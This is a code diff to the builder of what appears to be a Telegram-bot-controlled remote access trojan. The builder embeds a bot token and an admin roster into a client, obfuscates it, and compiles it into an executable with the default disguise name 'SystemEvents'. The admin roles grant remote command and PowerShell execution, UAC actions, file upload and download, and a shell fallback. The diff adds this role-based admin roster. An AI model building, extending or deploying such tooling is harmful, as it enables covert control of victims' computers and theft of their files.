@@ -14,7 +14,6 @@ if os.name == "nt":
         k32.SetConsoleMode(h, mode.value | 0x0004)
     except Exception:
         pass
-
     try:
         import ctypes
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
@@ -58,6 +57,13 @@ ICON       = Path("resources/app.ico")
 LOG_DIR    = Path("logs")
 LOG_FILE   = LOG_DIR / "builder.log"
 DEFAULT_APP_NAME = "SystemEvents"
+
+ROLES      = {"op": 1, "admin": 2, "super": 3}
+ROLE_DESC  = {
+    "op":    "read-only: /start /help /heartbeat /admins /getfile",
+    "admin": "op + /cmd /powershell /uac /putfile /uninstall + shell fallback",
+    "super": "admin + receives watchdog alerts",
+}
 
 console = Console(legacy_windows=False)
 
@@ -169,7 +175,7 @@ def menu() -> str:
     table = Table(box=box.ROUNDED, show_header=False, border_style="cyan", padding=(0, 2))
     table.add_column("k", style="bold yellow", justify="right")
     table.add_column("action")
-    table.add_row("[1]", "Set config and build everything automatically")
+    table.add_row("[1]", "Set config (incl. admins) and build everything automatically")
     table.add_row("[2]", "Rebuild .exe only")
     table.add_row("[3]", "Regenerate client.py + client_obf.py")
     table.add_row("[4]", "Show current settings")
@@ -216,19 +222,19 @@ def load_conf() -> dict:
     return {}
 
 
-def save_conf(token: str, admin_id: str, name: str, app_name: str):
+def save_conf(token: str, admins: dict, name: str, app_name: str):
     CONF.parent.mkdir(parents=True, exist_ok=True)
-    CONF.write_text(
-        json.dumps({
-            "token": token,
-            "admin_id": admin_id,
-            "name": name,
-            "app_name": app_name,
-        }, indent=2),
-        encoding="utf-8",
-    )
-    log.info("config saved: admin_id=%s name=%r app_name=%r token=%s...%s",
-             admin_id, name, app_name,
+    payload = {
+        "token": token,
+        "admins": admins,
+        "name": name,
+        "app_name": app_name,
+    }
+    CONF.write_text(json.dumps(payload, indent=2), encoding="utf-8")
+
+    log.info("config saved: name=%r app_name=%r admins=%s token=%s...%s",
+             name, app_name,
+             {k: v for k, v in admins.items()},
              token[:8] if len(token) > 8 else "***",
              token[-4:] if len(token) > 4 else "***")
 
@@ -241,16 +247,6 @@ def ask_token() -> str:
             return v
         log.warning("invalid token format rejected")
         console.print("[red][WARN] invalid token format[/]")
-
-
-def ask_id() -> str:
-    while True:
-        v = Prompt.ask("[cyan]Admin ID[/]").strip()
-        if valid_id(v):
-            log.debug("admin id accepted: %s", v)
-            return v
-        log.warning("invalid admin id rejected: %r", v)
-        console.print("[red][WARN] ID must be a number[/]")
 
 
 def ask_name() -> str:
@@ -274,6 +270,96 @@ def ask_app_name(default: str = DEFAULT_APP_NAME) -> str:
             return v
         log.warning("invalid app name rejected: %r", v)
         console.print("[red][WARN] letters/digits/_/- only, up to 40 chars[/]")
+
+
+def show_admins_table(admins: dict):
+    t = Table(box=box.SIMPLE, border_style="cyan", show_header=True)
+    t.add_column("#", style="dim", justify="right")
+    t.add_column("user_id", style="bold")
+    t.add_column("role")
+    t.add_column("what they get", style="dim")
+    for i, (uid, role) in enumerate(admins.items(), 1):
+        mark = "⭐" if role == "super" else "🛡" if role == "admin" else "👁"
+        t.add_row(str(i), str(uid), f"{mark} {role}", ROLE_DESC.get(role, "?"))
+    console.print(t)
+
+
+def collect_admins(existing: dict | None = None) -> dict:
+    admins: dict[str, str] = dict(existing or {})
+
+    console.print(Panel(
+        "[bold]Admins are baked into the binary at build time.[/]\n"
+        "[dim]They cannot be added, removed, or changed at runtime.\n"
+        "To change them you must rebuild the client and redeliver it.[/]\n\n"
+        f"roles: [cyan]op[/] < [cyan]admin[/] < [cyan]super[/]\n"
+        f"  op    — {ROLE_DESC['op']}\n"
+        f"  admin — {ROLE_DESC['admin']}\n"
+        f"  super — {ROLE_DESC['super']}",
+        border_style="cyan",
+        title="[bold]Admin roster[/]",
+    ))
+
+    if admins:
+        console.print("[dim]Existing roster loaded from builder.conf:[/]")
+        show_admins_table(admins)
+        if not Confirm.ask("[yellow]Keep and edit this roster?[/]", default=True):
+            admins = {}
+
+    while True:
+        console.print()
+        if admins:
+            console.print("[dim]Current roster:[/]")
+            show_admins_table(admins)
+
+        console.print("\n[bold]Add entry[/] [dim](blank id to stop)[/]")
+        uid_raw = Prompt.ask("[cyan]  user_id[/]", default="").strip()
+        if not uid_raw:
+            break
+
+        if not valid_id(uid_raw):
+            console.print("[red][WARN] user_id must be an integer[/]")
+            continue
+
+        uid = str(int(uid_raw))
+
+        if uid in admins:
+            console.print(f"[yellow]user {uid} already in roster as {admins[uid]}, overwriting[/]")
+
+        role = Prompt.ask(
+            f"[cyan]  role for {uid}[/]",
+            choices=list(ROLES.keys()),
+            default="admin",
+        ).strip().lower()
+        if role not in ROLES:
+            console.print(f"[red][WARN] role must be one of {list(ROLES)}[/]")
+            continue
+
+        admins[uid] = role
+
+    if not admins:
+        console.print("[red]Roster is empty. At least one 'super' is required.[/]")
+        while True:
+            uid_raw = Prompt.ask("[cyan]Primary super user_id[/]").strip()
+            if not valid_id(uid_raw):
+                console.print("[red][WARN] user_id must be an integer[/]")
+                continue
+            admins[str(int(uid_raw))] = "super"
+            break
+
+    if not any(v == "super" for v in admins.values()):
+        console.print("[red]No 'super' in roster. Which user should be super?[/]")
+        while True:
+            uid_raw = Prompt.ask("[cyan]Promote to super (user_id)[/]").strip()
+            if not valid_id(uid_raw):
+                console.print("[red][WARN] user_id must be an integer[/]")
+                continue
+            admins[str(int(uid_raw))] = "super"
+            break
+
+    console.print()
+    console.print("[green][OK] Final roster:[/]")
+    show_admins_table(admins)
+    return admins
 
 
 def _src_signature(path: Path) -> tuple:
@@ -325,8 +411,8 @@ def paths_for(name: str):
     return result
 
 
-def build_py(token: str, admin_id: str, name: str, app_name: str = DEFAULT_APP_NAME):
-    log.info("build_py start: name=%r app_name=%r", name, app_name)
+def build_py(token: str, admins: dict, name: str, app_name: str = DEFAULT_APP_NAME):
+    log.info("build_py start: name=%r app_name=%r admins=%d", name, app_name, len(admins))
 
     if not TEMPLATE.exists():
         log.error("template missing: %s", TEMPLATE)
@@ -342,20 +428,25 @@ def build_py(token: str, admin_id: str, name: str, app_name: str = DEFAULT_APP_N
 
     log.debug("template loaded: %d bytes", len(src))
 
-    for ph in ("__TOKEN__", "__ADMIN_ID__", "__NAME__", "__APP_NAME__"):
+    for ph in ("__TOKEN__", "__ADMINS__", "__NAME__", "__APP_NAME__"):
         if ph not in src:
             log.error("template has no placeholder: %s", ph)
             console.print(f"[red][ERR] template.py has no placeholder {ph}[/]")
             sys.exit(1)
 
     token_b64 = base64.b64encode(token.encode("utf-8")).decode("ascii")
-    aid_b64 = base64.b64encode(admin_id.encode("utf-8")).decode("ascii")
-    log.debug("secrets base64-encoded (token_b64=%dB, aid_b64=%dB)",
-              len(token_b64), len(aid_b64))
+
+    admins_json = json.dumps({str(k): v for k, v in admins.items()},
+                             separators=(",", ":"), sort_keys=True)
+    admins_b64  = base64.b64encode(admins_json.encode("utf-8")).decode("ascii")
+
+    log.debug("secrets base64-encoded (token_b64=%dB, admins_b64=%dB, roster=%s)",
+              len(token_b64), len(admins_b64),
+              {str(k): v for k, v in admins.items()})
 
     client_src = (src
                   .replace("__TOKEN__", token_b64)
-                  .replace("__ADMIN_ID__", aid_b64)
+                  .replace("__ADMINS__", admins_b64)
                   .replace("__NAME__", name)
                   .replace("__APP_NAME__", app_name))
 
@@ -400,6 +491,7 @@ def build_py(token: str, admin_id: str, name: str, app_name: str = DEFAULT_APP_N
     console.print(f"[green][OK][/]  Clean:      [bold]{p['py']}[/]")
     console.print(f"[green][OK][/]  Obfuscated: [bold]{p['obf']}[/]")
     console.print(f"[green][OK][/]  App name:   [bold cyan]{app_name}[/]")
+    console.print(f"[green][OK][/]  Admins:     [bold cyan]{len(admins)}[/] baked in")
     log.info("build_py done: %s, %s", p["py"], p["obf"])
     return p["py"], p["obf"]
 
@@ -469,7 +561,7 @@ def build_exe(name: str, obf: bool = True, force: bool = False):
             "logging", "lzma", "os", "pathlib", "platform", "random",
             "shutil", "signal", "socket", "string", "subprocess", "sys",
             "time", "urllib.request", "urllib.error", "uuid", "zlib",
-            "ctypes",
+            "ctypes", "functools",
         ]
         if os.name == "nt":
             HIDDEN.append("winreg")
@@ -581,16 +673,26 @@ def show_conf():
         return
     t = c.get("token", "")
     masked = t[:10] + "..." + t[-4:] if len(t) > 14 else "***"
+
     table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
     table.add_column("k", style="bold")
     table.add_column("v")
     table.add_row("Token", masked)
-    table.add_row("Admin ID", str(c.get("admin_id", "-")))
     table.add_row("Client name", str(c.get("name", "-")))
     table.add_row("App name", str(c.get("app_name", DEFAULT_APP_NAME)))
+
+    admins = c.get("admins") or {}
+    table.add_row("Admins", f"{len(admins)} baked in")
+
     console.print(Panel(table, title="Current settings", border_style="cyan"))
-    log.debug("show_conf: admin_id=%s name=%r app_name=%r",
-              c.get("admin_id"), c.get("name"), c.get("app_name"))
+
+    if admins:
+        console.print()
+        console.print("[bold]Roster:[/]")
+        show_admins_table({str(k): v for k, v in admins.items()})
+
+    log.debug("show_conf: name=%r app_name=%r admins=%s",
+              c.get("name"), c.get("app_name"), admins)
 
 
 def list_clients():
@@ -656,17 +758,13 @@ def flow_configure_and_build():
     c = load_conf()
 
     console.print(Panel(
-        "[bold]Enter config - everything else runs automatically[/]\n"
+        "[bold]Enter config — everything else runs automatically[/]\n"
         "[dim]Enter = keep current value from builder.conf[/]",
         border_style="cyan"))
 
     token = Prompt.ask("[cyan]Bot token[/]", default=c.get("token", ""))
     if not token or not valid_token(token):
         token = ask_token()
-
-    aid = Prompt.ask("[cyan]Admin ID[/]", default=c.get("admin_id", ""))
-    if not aid or not valid_id(aid):
-        aid = ask_id()
 
     name = Prompt.ask("[cyan]Client name[/]", default=c.get("name", "BOT Client"))
     if not name or not valid_name(name):
@@ -680,13 +778,17 @@ def flow_configure_and_build():
     if not app_name or not valid_app_name(app_name):
         app_name = ask_app_name(app_default)
 
-    save_conf(token, aid, name, app_name)
+    console.print()
+    existing = c.get("admins") or {}
+    admins = collect_admins(existing)
+
+    save_conf(token, admins, name, app_name)
     console.print(
         f"[green][OK] Config saved[/] "
-        f"[dim](app name: {app_name})[/], starting build...\n"
+        f"[dim](app name: {app_name}, admins: {len(admins)})[/], starting build...\n"
     )
 
-    build_py(token, aid, name, app_name)
+    build_py(token, admins, name, app_name)
 
     console.print()
     build_exe(name, obf=True)
@@ -700,9 +802,13 @@ def flow_regenerate_py():
         log.warning("regenerate_py: no config")
         console.print("[red]Set config first (option 1)[/]")
         return
+    if not c.get("admins"):
+        log.warning("regenerate_py: no admins in config")
+        console.print("[red]No admin roster in builder.conf, run option 1[/]")
+        return
     build_py(
         c["token"],
-        c["admin_id"],
+        c["admins"],
         c.get("name", "BOT Client"),
         c.get("app_name", DEFAULT_APP_NAME),
     )
@@ -725,7 +831,7 @@ def flow_rebuild_exe():
         console.print("[yellow]client_obf.py not found, generating...[/]")
         build_py(
             c["token"],
-            c["admin_id"],
+            c["admins"],
             name,
             c.get("app_name", DEFAULT_APP_NAME),
         )
